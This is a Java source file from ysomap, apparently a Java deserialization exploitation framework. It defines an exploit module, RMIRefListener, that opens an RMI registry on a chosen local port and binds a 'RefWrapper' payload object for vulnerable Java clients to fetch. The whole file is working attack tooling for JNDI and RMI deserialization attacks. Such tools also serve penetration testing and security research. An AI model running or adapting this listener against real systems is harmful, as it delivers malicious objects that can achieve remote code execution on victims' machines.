package ysomap.core.exploit.rmi;

import ysomap.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.util.Logger;

import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"RefWrapper"})
@Dependencies({"need set a gadget to return"})
public class RMIRefListener extends Exploit {

    @NotNull
    @Require(name = "lport", type = "int", detail = "local port to listen")
    public String lport;

    @NotNull
    @Require(name = "objectName", detail = "binding object's name")
    public String objectName;

    @NotNull
    public Object payload;
    public String payloadName;

    private Registry registry;

    @Override
    public void work() {
        System.setProperty("sun.rmi.transport.tcp.logLevel","BRIEF");
        try {
            registry = LocateRegistry.createRegistry(Integer.parseInt(lport));
            registry.bind(objectName, (Remote) payload);
            Logger.success("RMIRefListener listening on "+ lport);
        } catch (RemoteException | AlreadyBoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        if(registry != null){
            try {// close rmi registry
                registry.unbind(objectName);
                UnicastRemoteObject.unexportObject(registry, true);
            } catch (RemoteException | NotBoundException e) {
                e.printStackTrace();
            }
            Logger.success("RMIRef Listener stopped");
        }
        exit = true;
    }

    @Override
    public String toString() {
        return "RMIRefListener{" +
                "lport='" + lport + '\'' +
                ", objectName='" + objectName + '\'' +
                ", payload='" + payloadName + '\'' +
                '}';
    }

}
